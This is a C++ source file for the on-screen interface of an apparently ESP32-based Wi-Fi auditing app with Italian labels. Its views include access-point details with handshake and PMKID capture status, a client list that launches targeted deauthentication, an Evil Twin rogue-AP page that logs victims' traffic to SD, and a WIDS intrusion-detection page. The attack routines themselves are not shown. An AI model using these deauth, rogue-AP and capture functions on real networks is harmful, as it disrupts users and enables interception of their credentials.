            if (hit != ctx->handshakes.end()) {
                hsPresent = true;
                for (int s = 0; s < 4; s++) hsHas[s] = (hit->second.msgMask & (1 << s)) != 0;
                hsPmkid = hit->second.hasPmkid;
                hsSaved = hit->second.saved;
            }
        }
        deauthBursts = ctx->deauthBurstsSent;
        evilTwin = ctx->evilTwinActive;
        ctx->mutex.unlock();
    }
    if (!found) return;

    uint64_t now = nowMs();
    const char* vendor = lookupVendor(ap.record.bssid);
    uint32_t beaconsSinceOpen = ap.packetCount >= beaconBaseline ? ap.packetCount - beaconBaseline : 0;

    char buf[128];

    snprintf(buf, sizeof(buf), "SSID: %s", displaySsid(ap.record));
    lv_label_set_text(ctx->detailSsidLabel, buf);

    snprintf(buf, sizeof(buf), "MAC: %s (%s)", macToString(ap.record.bssid).c_str(), vendor != nullptr ? vendor : "sconosciuto");
    lv_label_set_text(ctx->detailMacLabel, buf);

    if (!ap.fromCapture) {
        snprintf(buf, sizeof(buf), "Sicurezza: %s | Cifratura: %s", authToString(ap.record.authentication_type), cipherToString(ap.record.pairwise_cipher));
    } else {
        snprintf(buf, sizeof(buf), "Sicurezza: %s (da cattura)", authToString(ap.record.authentication_type));
    }
    lv_label_set_text(ctx->detailSecLabel, buf);

    if (ctx->detailPmfLabel != nullptr) {
        uint32_t pmfColor = 0xEF4444;
        if (ap.pmf == PmfState::Required) {
            pmfColor = 0x22C55E;
        } else if (ap.pmf == PmfState::Capable) {
            pmfColor = 0xEAB308;
        }
        snprintf(buf, sizeof(buf), "PMF (802.11w): %s", pmfToString(ap.pmf));
        lv_label_set_text(ctx->detailPmfLabel, buf);
        lv_obj_set_style_text_color(ctx->detailPmfLabel, lv_color_hex(pmfColor), 0);
    }

    snprintf(buf, sizeof(buf), "Canale: %d (%d MHz)", (int)ap.record.channel, frequencyMhz((int)ap.record.channel));
    lv_label_set_text(ctx->detailChanLabel, buf);

    snprintf(buf, sizeof(buf), "Potenza: %d dBm (min %d / max %d) | %.1f m", (int)ap.record.rssi, (int)ap.rssiMin, (int)ap.rssiMax, estimateDistanceMeters(ap.record.rssi));
    lv_label_set_text(ctx->detailPowerLabel, buf);

    snprintf(buf, sizeof(buf), "PHY: %s | Fonte: %s", phyToString(ap.record.phy_flags).c_str(), ap.fromCapture ? "passiva" : "attiva");
    lv_label_set_text(ctx->detailPhyLabel, buf);

    snprintf(buf, sizeof(buf), "Beacon: %u | Visto: %us fa", (unsigned)beaconsSinceOpen, (unsigned)((now - ap.lastSeenMs) / 1000));
    lv_label_set_text(ctx->detailTimeLabel, buf);

    if (ctx->detailHsSummary != nullptr) {
        int hsCount = (hsHas[0] ? 1 : 0) + (hsHas[1] ? 1 : 0) + (hsHas[2] ? 1 : 0) + (hsHas[3] ? 1 : 0);
        char hsSummary[64];
        snprintf(hsSummary, sizeof(hsSummary), "Stato -> HS: %d/4%s | PMKID: %s",
            hsCount, (hsPresent && hsSaved) ? " (salvato)" : "", hsPmkid ? "SI" : "NO");
        lv_label_set_text(ctx->detailHsSummary, hsSummary);
    }

    if (ctx->detailDeauthLabel != nullptr) {
        if (deauthBursts > 0) {
            snprintf(buf, sizeof(buf), "Deauth inviati: %d", deauthBursts);
            lv_label_set_text(ctx->detailDeauthLabel, buf);
            lv_obj_remove_flag(ctx->detailDeauthLabel, LV_OBJ_FLAG_HIDDEN);
        } else {
            lv_obj_add_flag(ctx->detailDeauthLabel, LV_OBJ_FLAG_HIDDEN);
        }
    }

    if (ctx->detailClientsButton != nullptr) {
        char buttonText[32];
        snprintf(buttonText, sizeof(buttonText), "Client (%d)", clientCount);
        lv_obj_t* label = lv_obj_get_child(ctx->detailClientsButton, 0);
        if (label != nullptr) lv_label_set_text(label, buttonText);
    }

    if (ctx->detailLockButton != nullptr) {
        bool lockedHere = getCaptureLockChannel() == (int)ap.record.channel && ap.record.channel >= 1;
        char lockText[48];
        if (lockedHere) {
            snprintf(lockText, sizeof(lockText), LV_SYMBOL_SETTINGS " Lock (ch %d)", (int)ap.record.channel);
        } else {
            snprintf(lockText, sizeof(lockText), "Channel Lock");
        }
        lv_obj_t* label = lv_obj_get_child(ctx->detailLockButton, 0);
        if (label != nullptr) lv_label_set_text(label, lockText);
    }

    if (ctx->detailEvilTwinButton != nullptr) {
        char etText[32];
        if (evilTwin) snprintf(etText, sizeof(etText), "Evil Twin: ON");
        else snprintf(etText, sizeof(etText), "Evil Twin");
        lv_obj_t* label = lv_obj_get_child(ctx->detailEvilTwinButton, 0);
        if (label != nullptr) lv_label_set_text(label, etText);
    }
}

constexpr int CLIENT_ROW_HEIGHT = 30;
constexpr int COL_CDBM = 46;
constexpr int COL_TX = 46;
constexpr int COL_RX = 46;
constexpr int COL_IND = 20;

void onSelectClientForDeauth(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    lv_obj_t* row = lv_event_get_current_target_obj(event);
    uint64_t clientKey = 0;

    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        for (const auto& [k, w] : ctx->clientRows) {
            if (w == row) { clientKey = k; break; }
        }
        ctx->targetClientKey = clientKey;
        ctx->mutex.unlock();
    }

    if (clientKey != 0) {
        char macStr[18] = "";
        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
            auto it = ctx->clients.find(clientKey);
            if (it != ctx->clients.end()) {
                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    it->second.mac[0], it->second.mac[1], it->second.mac[2],
                    it->second.mac[3], it->second.mac[4], it->second.mac[5]);
            }
            ctx->mutex.unlock();
        }

        char message[128];
        snprintf(message, sizeof(message), "Invia deauth mirato al client:\n%s?", macStr);
        ctx->clientDeauthDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Deauth Mirato", message, { "Invia", "Annulla" });
    }
}

lv_obj_t* createClientRow(Context* ctx) {
    auto* row = lv_list_add_button(ctx->clientsList, nullptr, "");
    lv_obj_clean(row);
    applyFocusStyle(row);
    lv_obj_set_height(row, CLIENT_ROW_HEIGHT);
    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(row, 2, 0);
    lv_obj_set_style_pad_column(row, 4, 0);

    auto* mac = lv_label_create(row);
    lv_label_set_long_mode(mac, LV_LABEL_LONG_MODE_SCROLL_CIRCULAR);
    lv_obj_set_flex_grow(mac, 1);

    addFieldLabel(row, COL_CDBM);
    addFieldLabel(row, COL_TX);
    addFieldLabel(row, COL_RX);

    auto* indicator = lv_label_create(row);
    lv_obj_set_width(indicator, COL_IND);
    lv_label_set_text(indicator, LV_SYMBOL_WARNING);
    lv_obj_set_style_text_color(indicator, lv_color_hex(0xB33A3A), 0);
    lv_obj_set_style_text_align(indicator, LV_TEXT_ALIGN_CENTER, 0);

    lv_obj_add_event_cb(row, onSelectClientForDeauth, LV_EVENT_CLICKED, ctx);

    return row;
}

void updateClientsPage(Context* ctx) {
    if (ctx->clientsList == nullptr) return;

    struct Row { uint64_t key; uint32_t frames; std::string mac; int rssi; uint32_t tx; uint32_t rx; };
    std::vector<Row> clientRows2;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        uint64_t selected = ctx->selectedKey;
        uint64_t now = nowMs();
        for (auto it = ctx->clients.begin(); it != ctx->clients.end();) {
            if (now - it->second.lastSeenMs > ROW_EXPIRY_MS) {
                it = ctx->clients.erase(it);
                continue;
            }
            const auto& client = it->second;
            if (client.associatedBssid != selected) { ++it; continue; }

            bool randomMac = (client.mac[0] & 0x02) != 0;
            const char* vendor = randomMac ? nullptr : lookupVendor(client.mac);
            std::string mac = macToString(client.mac) + (randomMac ? " (casuale)" : "");
            if (vendor != nullptr) mac += std::string(" - ") + vendor;

            clientRows2.push_back({it->first, client.packetCount, mac, client.lastRssi, client.txCount, client.rxCount});
            ++it;
        }
        ctx->mutex.unlock();
    }

    std::sort(clientRows2.begin(), clientRows2.end(), [](const Row& a, const Row& b) { return a.frames > b.frames; });

    std::vector<uint64_t> keys;
    for (const auto& row : clientRows2) keys.push_back(row.key);
    for (auto it = ctx->clientRows.begin(); it != ctx->clientRows.end();) {
        if (std::find(keys.begin(), keys.end(), it->first) == keys.end()) {
            lv_obj_delete(it->second);
            it = ctx->clientRows.erase(it);
        } else {
            ++it;
        }
    }
    for (const auto& row : clientRows2) {
        lv_obj_t* widget;
        auto it = ctx->clientRows.find(row.key);
        if (it == ctx->clientRows.end()) {
            widget = createClientRow(ctx);
            ctx->clientRows[row.key] = widget;
        } else {
            widget = it->second;
        }
        char dbm[12], tx[12], rx[12];
        snprintf(dbm, sizeof(dbm), "%d", row.rssi);
        snprintf(tx, sizeof(tx), "%u", (unsigned)row.tx);
        snprintf(rx, sizeof(rx), "%u", (unsigned)row.rx);
        lv_label_set_text(lv_obj_get_child(widget, 0), row.mac.c_str());
        lv_label_set_text(lv_obj_get_child(widget, 1), dbm);
        lv_label_set_text(lv_obj_get_child(widget, 2), tx);
        lv_label_set_text(lv_obj_get_child(widget, 3), rx);
    }
}

void goBack(Context* ctx) {
    Page current;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        current = ctx->page;
        ctx->mutex.unlock();
    } else {
        return;
    }
    if (current == Page::Detail) showPage(ctx, Page::List);
    else if (current == Page::List) showPage(ctx, Page::Graph);
    else if (current == Page::Clients) showPage(ctx, Page::Detail);
    else if (current == Page::EvilTwinDetail) showPage(ctx, Page::Detail);
    else if (current == Page::Graph) showPage(ctx, Page::ModuleHome);
    else if (current == Page::WidsGraph) showPage(ctx, Page::ModuleHome);
    else if (current == Page::WidsDetail) showPage(ctx, Page::ModuleHome);
    else if (current == Page::Recon) showPage(ctx, Page::ModuleHome);
    else if (current == Page::ModuleHome) app_event_emit_close(ctx->appInstanceId);
}

void onHardwareBack(void* userData) {
    goBack(static_cast<Context*>(userData));
}

// ---- UI page builders ----

lv_obj_t* createPage(lv_obj_t* parent) {
    auto* page = lv_obj_create(parent);
    lv_obj_set_flex_flow(page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_width(page, LV_PCT(100));
    lv_obj_set_flex_grow(page, 1);
    lv_obj_set_style_pad_all(page, 0, 0);
    lv_obj_set_style_border_width(page, 0, 0);
    return page;
}

void createAxisLabels(lv_obj_t* parent) {
    auto* row = lv_obj_create(parent);
    lv_obj_set_size(row, LV_PCT(100), 16);
    lv_obj_set_style_pad_all(row, 0, 0);
    lv_obj_set_style_border_width(row, 0, 0);
    lv_obj_remove_flag(row, LV_OBJ_FLAG_SCROLLABLE);
    for (int channel = 1; channel <= 13; channel++) {
        char text[4];
        snprintf(text, sizeof(text), "%d", channel);
        auto* label = lv_label_create(row);
        lv_label_set_text(label, text);
        lv_obj_set_style_text_color(label, lv_color_hex(0x64748B), 0);
        lv_obj_set_x(label, lv_pct((int)(100 * channelFraction(channel))));
        lv_obj_set_style_translate_x(label, channel < 10 ? -4 : -8, 0);
    }
}

void createChannelGrid(lv_obj_t* chartWrapper) {
    for (int channel = 1; channel <= 13; channel++) {
        auto* line = lv_obj_create(chartWrapper);
        lv_obj_set_size(line, 1, LV_PCT(100));
        lv_obj_set_style_border_width(line, 0, 0);
        lv_obj_set_style_radius(line, 0, 0);
        lv_obj_set_style_bg_color(line, lv_color_hex(0x334155), 0);
        lv_obj_set_style_bg_opa(line, LV_OPA_20, 0);
        lv_obj_remove_flag(line, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_remove_flag(line, LV_OBJ_FLAG_CLICKABLE);
        lv_obj_set_x(line, lv_pct((int)(100 * channelFraction(channel))));
    }
}

void createYAxisLabels(lv_obj_t* chartWrapper) {
    const struct { const char* text; int pctY; } marks[] = {
        {"-30", 2},
        {"-50", 26},
        {"-70", 55},
        {"-90", 84},
    };
    for (const auto& m : marks) {
        auto* label = lv_label_create(chartWrapper);
        lv_label_set_text(label, m.text);
        lv_obj_set_style_text_color(label, lv_color_hex(0x606060), 0);
        lv_obj_set_style_text_opa(label, LV_OPA_80, 0);
        lv_obj_set_x(label, 2);
        lv_obj_set_y(label, lv_pct(m.pctY));
        lv_obj_remove_flag(label, LV_OBJ_FLAG_CLICKABLE);
        lv_obj_remove_flag(label, LV_OBJ_FLAG_SCROLLABLE);
    }
}

lv_obj_t* createIconButton(lv_obj_t* parent, const char* icon, lv_event_cb_t callback, Context* ctx, int width = 40, int height = 40) {
    auto* button = lv_button_create(parent);
    lv_obj_set_size(button, width, height);
    lv_obj_set_style_pad_all(button, 0, 0);
    applyFocusStyle(button);
    auto* label = lv_label_create(button);
    lv_label_set_text(label, icon);
    lv_obj_center(label);
    lv_obj_add_event_cb(button, callback, LV_EVENT_SHORT_CLICKED, ctx);
    return button;
}

lv_obj_t* createImageButton(lv_obj_t* parent, const void* src, lv_event_cb_t callback, Context* ctx, int width = 40, int height = 40) {
    auto* button = lv_button_create(parent);
    lv_obj_set_size(button, width, height);
    lv_obj_set_style_pad_all(button, 0, 0);
    applyFocusStyle(button);
    auto* img = lv_image_create(button);
    lv_image_set_src(img, src);
    lv_obj_center(img);
    lv_obj_add_event_cb(button, callback, LV_EVENT_SHORT_CLICKED, ctx);
    return button;
}

lv_obj_t* createSectionCard(lv_obj_t* parent, const char* titleText) {
    auto* card = lv_button_create(parent);
    applyFocusStyle(card);
    lv_obj_set_width(card, LV_PCT(100));
    lv_obj_set_height(card, LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(card, 4, 0);
    lv_obj_set_style_pad_row(card, 2, 0);
    lv_obj_set_style_radius(card, 4, 0);
    lv_obj_set_style_border_width(card, 1, 0);
    lv_obj_set_style_border_color(card, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(card, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(card, LV_OPA_COVER, 0);
    lv_obj_remove_flag(card, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(card, LV_OBJ_FLAG_SCROLL_ON_FOCUS);

    if (titleText && titleText[0] != '\0') {
        auto* title = lv_label_create(card);
        lv_label_set_text(title, titleText);
        lv_obj_set_style_text_color(title, lv_color_hex(0x80C0FF), 0);
    }
    return card;
}

void updateEvilTwinDetailPage(Context* ctx) {
#ifdef ESP_PLATFORM
    if (ctx->etStatusLabel == nullptr || ctx->etClientsList == nullptr) return;

    char statusBuf[160];
    char ssid[33] = {};
    bool active = false;
    int channel = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) {
            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
            channel = it->second.record.channel;
        }
        active = ctx->evilTwinActive;
        ctx->mutex.unlock();
    }

    bool logging = ctx->evilTwinLogging.load();
    uint32_t pkts = g_etPacketsLogged.load();

    snprintf(statusBuf, sizeof(statusBuf), "SSID: %s\nCanale: %d | Stato: %s\nLog SD: %s (%u pkt)",
        ssid[0] != '\0' ? ssid : "(nascosta)", channel,
        active ? "ATTIVO (Rogue AP)" : "SPENTO",
        logging ? "IN CORSO" : "FERMO", (unsigned)pkts);
    lv_label_set_text(ctx->etStatusLabel, statusBuf);

    if (ctx->etLogToggleButton != nullptr) {
        lv_obj_t* label = lv_obj_get_child(ctx->etLogToggleButton, 0);
        if (label != nullptr) {
            if (logging) {
                char btnTxt[48];
                snprintf(btnTxt, sizeof(btnTxt), LV_SYMBOL_STOP " Ferma Log SD (%u)", (unsigned)pkts);
                lv_label_set_text(label, btnTxt);
            } else {
                lv_label_set_text(label, LV_SYMBOL_SAVE " Avvia Logging Traffico SD");
            }
        }
    }

    if (active) {
        wifi_sta_list_t sta_list = {};
        if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK) {
            lv_obj_clean(ctx->etClientsList);
            for (int i = 0; i < sta_list.num; i++) {
                char macStr[18];
                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    sta_list.sta[i].mac[0], sta_list.sta[i].mac[1], sta_list.sta[i].mac[2],
                    sta_list.sta[i].mac[3], sta_list.sta[i].mac[4], sta_list.sta[i].mac[5]);
                
                auto* row = lv_list_add_button(ctx->etClientsList, LV_SYMBOL_WARNING, macStr);
                applyFocusStyle(row);
                lv_obj_set_height(row, 30);
            }
            if (sta_list.num == 0) {
                auto* row = lv_list_add_button(ctx->etClientsList, nullptr, "Nessun client agganciato");
                applyFocusStyle(row);
                lv_obj_set_height(row, 30);
            }
        }
    } else {
        lv_obj_clean(ctx->etClientsList);
        auto* row = lv_list_add_button(ctx->etClientsList, nullptr, "Evil Twin non attivo");
        applyFocusStyle(row);
        lv_obj_set_height(row, 30);
    }
#else
    (void)ctx;
#endif
}

void createEvilTwinDetailPage(Context* ctx, lv_obj_t* parent) {
    ctx->etDetailPage = createPage(parent);
    lv_obj_add_flag(ctx->etDetailPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_set_style_pad_all(ctx->etDetailPage, 4, 0);

    auto* scroll = lv_obj_create(ctx->etDetailPage);
    lv_obj_set_width(scroll, LV_PCT(100));
    lv_obj_set_flex_grow(scroll, 1);
    lv_obj_set_flex_flow(scroll, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(scroll, 4, 0);
    lv_obj_set_style_pad_row(scroll, 4, 0);

    auto* statusCard = createSectionCard(scroll, "Stato Rogue AP");
    ctx->etStatusLabel = lv_label_create(statusCard);
    lv_label_set_text(ctx->etStatusLabel, "Stato: INATTIVO");
    lv_label_set_long_mode(ctx->etStatusLabel, LV_LABEL_LONG_MODE_WRAP);
    lv_obj_set_width(ctx->etStatusLabel, LV_PCT(100));

    ctx->etLogToggleButton = lv_button_create(scroll);
    applyFocusStyle(ctx->etLogToggleButton);
    lv_obj_set_width(ctx->etLogToggleButton, LV_PCT(100));
    lv_obj_set_height(ctx->etLogToggleButton, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_ver(ctx->etLogToggleButton, 6, 0);
    lv_obj_set_style_radius(ctx->etLogToggleButton, 4, 0);
    lv_obj_set_style_border_width(ctx->etLogToggleButton, 1, 0);
    lv_obj_set_style_border_color(ctx->etLogToggleButton, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(ctx->etLogToggleButton, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(ctx->etLogToggleButton, LV_OPA_COVER, 0);
    lv_obj_add_flag(ctx->etLogToggleButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    auto* logLbl = lv_label_create(ctx->etLogToggleButton);
    lv_label_set_text(logLbl, LV_SYMBOL_SAVE " Avvia Logging Traffico SD");
    lv_obj_center(logLbl);
    lv_obj_add_event_cb(ctx->etLogToggleButton, [](lv_event_t* e) {
        auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
        char ssid[33] = {};
        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
            auto it = ctx->seen.find(ctx->selectedKey);
            if (it != ctx->seen.end()) {
                strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
            }
            ctx->mutex.unlock();
        }

        bool wasLogging = ctx->evilTwinLogging.load();
        if (!wasLogging) {
            if (startEvilTwinLogging(ssid[0] != '\0' ? ssid : "eviltwin")) {
                ctx->evilTwinLogging.store(true);
            }
        } else {
            stopEvilTwinLogging();
            ctx->evilTwinLogging.store(false);
        }
        updateEvilTwinDetailPage(ctx);
    }, LV_EVENT_CLICKED, ctx);

    auto* clientsCard = createSectionCard(scroll, "Client Agganciati al Rogue AP");
    ctx->etClientsList = lv_list_create(clientsCard);
    lv_obj_set_width(ctx->etClientsList, LV_PCT(100));
    lv_obj_set_height(ctx->etClientsList, 120);
    lv_obj_set_style_pad_all(ctx->etClientsList, 0, 0);
}

void updateWidsDetailPage(Context* ctx) {
    if (ctx->widsStartButton != nullptr) {
        lv_obj_t* lbl = lv_obj_get_child(ctx->widsStartButton, 0);
        if (lbl != nullptr) {
            lv_label_set_text(lbl, ctx->widsActive ? LV_SYMBOL_PAUSE " WIDS: ON" : LV_SYMBOL_PLAY " WIDS: OFF");
        }
        lv_obj_set_style_bg_color(ctx->widsStartButton, ctx->widsActive ? lv_color_hex(0x0D9488) : lv_color_hex(0x181818), 0);
        lv_obj_set_style_border_color(ctx->widsStartButton, ctx->widsActive ? lv_color_hex(0x14B8A6) : lv_color_hex(0x505050), 0);
    }

    if (ctx->widsPcapButton != nullptr) {
        bool pcap = ctx->widsPcapEnabled.load();
        lv_obj_t* lbl = lv_obj_get_child(ctx->widsPcapButton, 0);
        if (lbl != nullptr) {
            lv_label_set_text(lbl, pcap ? LV_SYMBOL_SAVE " PCAP: ON (SD)" : LV_SYMBOL_SAVE " PCAP: OFF");
        }
        lv_obj_set_style_bg_color(ctx->widsPcapButton, pcap ? lv_color_hex(0x0D9488) : lv_color_hex(0x181818), 0);
    }

    if (ctx->widsChannelModeButton != nullptr) {
        int lock = getCaptureLockChannel();
        lv_obj_t* lbl = lv_obj_get_child(ctx->widsChannelModeButton, 0);
        if (lbl != nullptr) {
            if (lock > 0) {
                char buf[32];
                snprintf(buf, sizeof(buf), LV_SYMBOL_SETTINGS " LOCK: CH %d", lock);
                lv_label_set_text(lbl, buf);
            } else {
                lv_label_set_text(lbl, LV_SYMBOL_SETTINGS " HOP (1-13)");
            }
        }
        lv_obj_set_style_bg_color(ctx->widsChannelModeButton, lock > 0 ? lv_color_hex(0xD97706) : lv_color_hex(0x181818), 0);
    }

    if (ctx->widsFilterSelfButton != nullptr) {
        lv_obj_t* lbl = lv_obj_get_child(ctx->widsFilterSelfButton, 0);
        if (lbl != nullptr) {
            lv_label_set_text(lbl, ctx->widsFilterSelf ? LV_SYMBOL_OK " FILTRA ME: ON" : LV_SYMBOL_CLOSE " FILTRA ME: OFF");
        }
        lv_obj_set_style_bg_color(ctx->widsFilterSelfButton, ctx->widsFilterSelf ? lv_color_hex(0x0D9488) : lv_color_hex(0x181818), 0);
        lv_obj_set_style_border_color(ctx->widsFilterSelfButton, ctx->widsFilterSelf ? lv_color_hex(0x14B8A6) : lv_color_hex(0x505050), 0);
    }

    if (ctx->widsThreatLabel != nullptr) {
        WidsAttackType threat = getRecentSevereThreat(ctx);
        char tBuf[128];
        if (threat != WidsAttackType::None) {
            uint32_t elapsedSec = (lv_tick_get() - ctx->widsSevereThreatTimestampMs) / 1000;
            unsigned min = elapsedSec / 60;
            unsigned sec = elapsedSec % 60;
            if (min > 0) {
                snprintf(tBuf, sizeof(tBuf), "Minaccia: " LV_SYMBOL_WARNING " ATTACCO %s (%um %us fa)!",
                    widsAttackToString(threat), min, sec);
            } else {
                snprintf(tBuf, sizeof(tBuf), "Minaccia: " LV_SYMBOL_WARNING " ATTACCO %s (%us fa)!",
                    widsAttackToString(threat), sec);
            }
            if (threat == WidsAttackType::DeauthFlood) {
                lv_obj_set_style_text_color(ctx->widsThreatLabel, lv_color_hex(0xEF4444), 0);
            } else {
                lv_obj_set_style_text_color(ctx->widsThreatLabel, lv_color_hex(0xF97316), 0);
            }
        } else {
            snprintf(tBuf, sizeof(tBuf), "Minaccia: " LV_SYMBOL_OK " NESSUNA ANOMALIA");
            lv_obj_set_style_text_color(ctx->widsThreatLabel, lv_color_hex(0x22C55E), 0);
        }
        lv_label_set_text(ctx->widsThreatLabel, tBuf);
    }

    if (ctx->widsMetricsLabel != nullptr) {
        int lock = getCaptureLockChannel();
        char mBuf[160];
        snprintf(mBuf, sizeof(mBuf),
            "Canale: %s | Deauth: %u/s (Picco: %u/s)\n"
            "Totale Allarmi: %d | PCAP salvati: %u pkt",
            lock > 0 ? ("CH " + std::to_string(lock) + " (Lock)").c_str() : "Hopping (Canali 1-13)",
            (unsigned)ctx->widsLastDeauthRate.load(),
            (unsigned)ctx->widsPeakDeauthRate.load(),
            ctx->widsTotalAttacks,
            (unsigned)g_widsPacketsLogged.load());
        lv_label_set_text(ctx->widsMetricsLabel, mBuf);
    }

    if (ctx->widsLogList != nullptr) {
        bool needRebuild = false;
        if (ctx->mutex.lock(50 / portTICK_PERIOD_MS)) {
            size_t curCount = ctx->widsEvents.size();
            uint32_t curTime = curCount > 0 ? ctx->widsEvents.front().timestampMs : 0;
            if (curCount != ctx->widsLogRenderedCount || curTime != ctx->widsLogRenderedTime) {
                needRebuild = true;
                ctx->widsLogRenderedCount = curCount;
                ctx->widsLogRenderedTime = curTime;
            }
            if (needRebuild) {
                lv_obj_clean(ctx->widsLogList);
                if (ctx->widsEvents.empty()) {
                    auto* emptyBtn = lv_list_add_button(ctx->widsLogList, nullptr, "Nessun incidente registrato.");
                    applyFocusStyle(emptyBtn);
                } else {
                    for (const auto& ev : ctx->widsEvents) {
                        char rowText[128];
                        snprintf(rowText, sizeof(rowText), "[%us fa] %s | ch%d (%u/s)",
                            (unsigned)((lv_tick_get() - ev.timestampMs) / 1000),
                            widsAttackToString(ev.type),
                            ev.channel, (unsigned)ev.rate);
                        auto* rowBtn = lv_list_add_button(ctx->widsLogList, nullptr, rowText);
                        applyFocusStyle(rowBtn);
                        lv_obj_set_style_pad_ver(rowBtn, 4, 0);
                        lv_obj_add_flag(rowBtn, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
                    }
                }
            }
            ctx->mutex.unlock();
        }
    }
}

void createWidsDetailPage(Context* ctx, lv_obj_t* parent) {
    ctx->widsDetailPage = createPage(parent);
    lv_obj_add_flag(ctx->widsDetailPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_set_style_pad_all(ctx->widsDetailPage, 2, 0);

    auto* scroll = lv_obj_create(ctx->widsDetailPage);
    lv_obj_set_width(scroll, LV_PCT(100));
    lv_obj_set_flex_grow(scroll, 1);
    lv_obj_set_flex_flow(scroll, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(scroll, 4, 0);
    lv_obj_set_style_pad_row(scroll, 4, 0);
    ctx->widsDetailScroll = scroll;

    auto* btnGrid = lv_obj_create(scroll);
    lv_obj_set_width(btnGrid, LV_PCT(100));
    lv_obj_set_height(btnGrid, LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(btnGrid, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_style_pad_all(btnGrid, 0, 0);
    lv_obj_set_style_pad_column(btnGrid, 4, 0);
    lv_obj_set_style_pad_row(btnGrid, 4, 0);
    lv_obj_set_style_border_width(btnGrid, 0, 0);
    lv_obj_set_style_bg_opa(btnGrid, LV_OPA_TRANSP, 0);
    lv_obj_remove_flag(btnGrid, LV_OBJ_FLAG_SCROLLABLE);

    // 1. Start/Stop WIDS (Top-Left)
    ctx->widsStartButton = lv_button_create(btnGrid);
    applyFocusStyle(ctx->widsStartButton);
    lv_obj_set_width(ctx->widsStartButton, LV_PCT(48));
    lv_obj_set_height(ctx->widsStartButton, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_ver(ctx->widsStartButton, 6, 0);
    lv_obj_set_style_radius(ctx->widsStartButton, 4, 0);
    lv_obj_set_style_border_width(ctx->widsStartButton, 1, 0);
    lv_obj_set_style_border_color(ctx->widsStartButton, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(ctx->widsStartButton, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(ctx->widsStartButton, LV_OPA_COVER, 0);
    lv_obj_add_flag(ctx->widsStartButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    auto* startLbl = lv_label_create(ctx->widsStartButton);
    lv_label_set_text(startLbl, LV_SYMBOL_PLAY " WIDS: OFF");
    lv_obj_center(startLbl);
    lv_obj_add_event_cb(ctx->widsStartButton, [](lv_event_t* e) {
        auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
        onWidsToggleClick(e);
        updateWidsDetailPage(ctx);
    }, LV_EVENT_CLICKED, ctx);

    // 2. HOP / Channel Mode (Top-Right, alla sua dx)
    ctx->widsChannelModeButton = lv_button_create(btnGrid);
    applyFocusStyle(ctx->widsChannelModeButton);
    lv_obj_set_width(ctx->widsChannelModeButton, LV_PCT(48));
    lv_obj_set_height(ctx->widsChannelModeButton, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_ver(ctx->widsChannelModeButton, 6, 0);
    lv_obj_set_style_radius(ctx->widsChannelModeButton, 4, 0);
    lv_obj_set_style_border_width(ctx->widsChannelModeButton, 1, 0);
    lv_obj_set_style_border_color(ctx->widsChannelModeButton, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(ctx->widsChannelModeButton, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(ctx->widsChannelModeButton, LV_OPA_COVER, 0);
    lv_obj_add_flag(ctx->widsChannelModeButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    auto* chModeLbl = lv_label_create(ctx->widsChannelModeButton);
    lv_label_set_text(chModeLbl, LV_SYMBOL_SETTINGS " HOP (1-13)");
    lv_obj_center(chModeLbl);
    lv_obj_add_event_cb(ctx->widsChannelModeButton, [](lv_event_t* e) {
        auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
        int curLock = getCaptureLockChannel();
        if (curLock <= 0) {
            int hop = g_hopChannel.load();
            setCaptureLockChannel((hop >= 1 && hop <= 13) ? hop : 1);
        } else {
            setCaptureLockChannel(0);
        }
        updateWidsDetailPage(ctx);
        updateViews(ctx);
    }, LV_EVENT_CLICKED, ctx);

    // 3. PCAP on/off (Bottom-Left, sotto start/stop)
    ctx->widsPcapButton = lv_button_create(btnGrid);
    applyFocusStyle(ctx->widsPcapButton);
    lv_obj_set_width(ctx->widsPcapButton, LV_PCT(48));
